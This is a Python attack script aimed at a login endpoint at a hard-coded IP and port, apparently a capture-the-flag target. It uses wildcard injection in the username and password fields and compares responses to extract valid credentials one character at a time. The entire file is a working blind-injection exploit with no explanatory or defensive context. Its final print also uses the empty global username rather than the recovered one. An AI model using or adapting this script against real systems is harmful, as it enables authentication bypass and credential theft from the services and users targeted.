import requests 
from urllib.request import Request
from urllib.request import urlopen
import os 

global url
global request_successfully



url = "http://167.71.143.20:30583/login"

request_successfully = requests.post(url, data = 
    {
        'username': '*',
        'password': '*'
    })

payload_username = ''
payload_password = ''


def discover_user(payload_username):

    for i in range(32, 126):
        
        if chr(i) != "*":
            username = payload_username +chr(i) + '*'
            new_request = requests.post(url, data = {'username':username , 'password':'*' }).text

            if new_request == request_successfully.text:
                payload_username += chr(i)
                discover_user(payload_username)
                exit()
            else:
                continue
        else:
            continue
    
    #print(payload_username)
    discover_password(payload_password, payload_username)
    



def discover_password(payload_password, username):


    for x in range(32,126):

        if chr(x) != "*": 
            
            password = payload_password + chr(x) + '*'
            new_request = requests.post(url, data = {'username': username, 'password': password}).text

            if new_request == request_successfully.text:
                payload_password += chr(x)
                discover_password(payload_password, username)
                exit()
            else:
                continue

        else:
            continue


    print(payload_username, payload_password)
discover_user(payload_username)




















